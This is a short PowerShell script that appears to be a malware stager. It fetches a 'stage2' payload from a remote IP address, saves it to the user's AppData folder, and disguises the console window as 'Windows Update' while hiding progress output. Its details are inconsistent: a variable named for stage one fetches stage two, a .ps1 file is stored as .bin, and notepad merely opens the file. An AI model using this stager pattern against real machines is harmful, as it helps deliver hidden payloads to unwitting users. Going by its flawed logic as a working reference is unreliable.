
$Stage1Url = "https://198.51.100.146/stage2.ps1"
$PayloadPath = "$env:APPDATA\payload.bin"
Invoke-WebRequest -Uri $Stage1Url -OutFile $PayloadPath -UseBasicParsing
Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath
$Host.UI.RawUI.WindowTitle = "Windows Update"
$ProgressPreference = "SilentlyContinue"
